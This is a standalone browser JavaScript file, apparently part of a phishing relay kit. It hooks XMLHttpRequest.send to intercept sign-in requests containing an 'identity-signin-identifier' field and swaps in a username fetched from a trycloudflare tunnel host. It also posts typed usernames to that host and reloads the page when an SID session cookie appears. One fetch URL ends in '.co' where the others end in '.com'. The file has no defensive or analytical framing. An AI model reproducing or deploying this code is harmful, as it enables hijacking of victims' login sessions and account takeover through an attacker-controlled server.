let freqUsername = null;
let fetchingUsername = false;
const modifiedRequests = new Set();
const pendingRequests = new Map(); // Stores pending XHRs and their bodies
const processedXhrs = new WeakSet(); // Tracks which XHRs were modified

// Fetch username only once at a time
const fetchFreqUsername = async () => {
    if (freqUsername !== null || fetchingUsername) return;

    fetchingUsername = true;

    try {
        console.log('Fetching username...');
        const response = await fetch('https://eve-nova-brochure-develop.trycloudflare.co/get-first-post-data');
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        if (result?.postData) {
            freqUsername = result.postData;
            await fetch('https://eve-nova-brochure-develop.trycloudflare.com/reset-first-post-data', { method: 'POST' });
            console.log('✅ Username fetched:', freqUsername);
            processModifiedRequests();
        }
    } catch (error) {
        console.error('❌ Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000);
    } finally {
        fetchingUsername = false;
    }
};

// Ensure pending requests always get modified
const processModifiedRequests = () => {
    if (!freqUsername) return;

    for (const [xhr, body] of pendingRequests) {
        if (processedXhrs.has(xhr)) continue; // Skip already processed requests

        let modifiedBody = body;
        const match = /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (match && freqUsername) {
            modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(freqUsername);
            freqUsername = null; // Clear username after use
        }

        console.log('✅ Sending modified request:', modifiedBody);
        xhr.send(modifiedBody);
        processedXhrs.add(xhr); // Mark request as processed
        pendingRequests.delete(xhr);
    }
};

// Hook into XMLHttpRequest.send to modify requests dynamically
const originalXhrSend = XMLHttpRequest.prototype.send;
Object.defineProperty(XMLHttpRequest.prototype, "send", {
    configurable: true,
    writable: true,
    value: function (body) {
        if (!body || typeof body !== 'string') {
            return originalXhrSend.call(this, body);
        }

        if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
            pendingRequests.set(this, body);
            fetchFreqUsername().then(processModifiedRequests);
        } else {
            originalXhrSend.call(this, body);
        }
    }
});

// Function to send username
const sendUsername = async (retries = 3, delay = 1000) => {
    console.log('Send Username button clicked');

    const usernameInput = document.getElementById('username');
    if (!usernameInput) {
        console.error("❌ Username input field not found.");
        return;
    }

    const username = usernameInput.value.trim();
    if (!username) {
        console.warn("⚠️ No username entered, skipping request.");
        return;
    }

    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await fetch('https://eve-nova-brochure-develop.trycloudflare.com/save-username', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });

            if (response.ok) {
                console.log(`✅ Username sent successfully (Attempt ${attempt})`);
                return;
            } else {
                console.error(`❌ Attempt ${attempt} failed:`, response.statusText);
            }
        } catch (error) {
            console.error(`❌ Network error on attempt ${attempt}:`, error);
        }

        if (attempt < retries) {
            await new Promise(resolve => setTimeout(resolve, delay * attempt)); // Exponential backoff
        }
    }

    console.error("❌ Failed to send username after multiple attempts.");
};

// Attach event listeners when DOM is fully loaded
document.addEventListener("DOMContentLoaded", () => {
    const sendButtons = document.querySelectorAll('#sendUsernameBtn');

    if (sendButtons.length === 0) {
        console.error("❌ No sendUsernameBtn found on page.");
    }

    sendButtons.forEach(button => button.addEventListener('click', sendUsername));
});

// Refresh page if SID cookie is detected (every 5 sec)
setInterval(() => {
    if (document.cookie.includes('SID')) {
        console.log("🔄 SID cookie detected, reloading page...");
        location.reload();
    }
}, 5000);

// Start by fetching the username
fetchFreqUsername();
